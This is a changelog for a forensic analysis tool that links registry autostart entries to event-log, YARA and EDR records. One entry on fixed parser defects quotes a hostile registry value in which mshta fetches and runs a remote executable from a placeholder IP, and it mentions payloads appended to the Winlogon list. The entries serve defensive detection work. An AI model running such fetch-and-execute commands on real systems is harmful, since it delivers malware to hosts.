# Changelog

What changed between released versions, in one screen. The **reasoning** — why a thing was built,
why another was refused, what a fix cost — lives in [`docs/roadmap.md`](docs/roadmap.md), which is
the single source of truth for the state of the project. This file is the index into it, not a
second copy of it: two documents saying the same thing in different words is how they start
disagreeing.

The product version is `analysis/engine/version.py` (`APP_VERSION`). It is stamped into every
exported analysis bundle, so an archived case records which build produced it.

## Unreleased

- **A registry finding contributes an artifact.** An ASEP value is a command line, and the program
  it launches is now parsed into `file.path` (`registry_asep.program_from_value`), so a Run key or a
  service `ImagePath` bridges to the EVTX/YARA/CrowdStrike/osquery records naming the same binary.
  One helper called by both registry adapters; the DLL-component lists deliberately contribute
  nothing. Closes the roadmap's open item.
- **Static analysis runs in the gate.** `tools/check-lint.sh` (ruff, `ruff.toml`) over `analysis/`
  and `tools/`; hard when ruff is installed, SKIP otherwise, like pytest. Its first run found 38
  findings, ten of them real (a duplicated word set, four dropped exception chains, unused imports
  and locals, a closure over a loop variable).
- **The source CLIs are tested end to end on mock files** (`tests/test_cli_sources.py`), and the two
  report renderers that had no test — the EVTX-slice Markdown and the JSON levels — now have one.
  Suite at 75% coverage, 114 tests.
- **Two defects the review of the artifact parse found.** A value whose last argument ends in a
  program extension was returned whole, so `mshta.exe http://203.0.113.20/x.exe` minted a local
  `x.exe` and bridged it to unrelated hosts; the artifact is now the shortest leading run ending in a
  program extension. And the Winlogon list branch returned the first entry — the platform's own
  `userinit.exe`, not the appended payload — missing the persistence while bridging every host
  through a ubiquitous binary; it returns the last entry, and `userinit.exe` joined the generic set.

## v1.0.0 — 2026-09-11

The first tagged release. What landed between the first commit and this tag is summarised below;
the reasoning is in [`docs/roadmap.md`](docs/roadmap.md). See [README, "How mature is it,
concretely"](README.md#how-mature-is-it-concretely) for what the project does and does not claim
about itself.

- **The RAG and the on-box LLM are gone.** The vector knowledge base (Qdrant + fastembed + rerank)
  and the local Ollama conversational engine were the two heaviest, least-validated subsystems. The
  knowledge base is now plain markdown under `method/`; the reasoning lives in an external agentic
  harness, reached through a new **analysis MCP server** (`analysis/analysis_mcp_server.py`:
  `analyze`, `analyze_case`, `eid_lookup`) that returns pseudonymized findings (§9).
- **The GUI stopped double-counting evidence.** Every Analyze click re-sent the whole accumulated
  session, and the case store's duplicate check hashes the whole batch: an overlapping batch was
  accepted and the earlier files were persisted twice, inflating every additive number.
- **A missing tool stopped reading as an empty result.** Adapter failures now carry the tool's own
  message (scrubbed of absolute paths — these strings reach reports and bundles), and a missing Zeek
  is stated instead of passed over.
- **`--json-out PATH`** is the canonical way to write JSON from the CLIs that take a path
  (`--json PATH` still works and says it is deprecated), and **`run_case new|add` takes all eleven
  sources**, so MFT, osquery, CrowdStrike and YARA evidence can enter a persistent case.
- **The gate is green in a fresh clone**, verified by cloning into a temporary directory and running
  it there. Two documentation guards were failing or crashing outside the author's own tree.
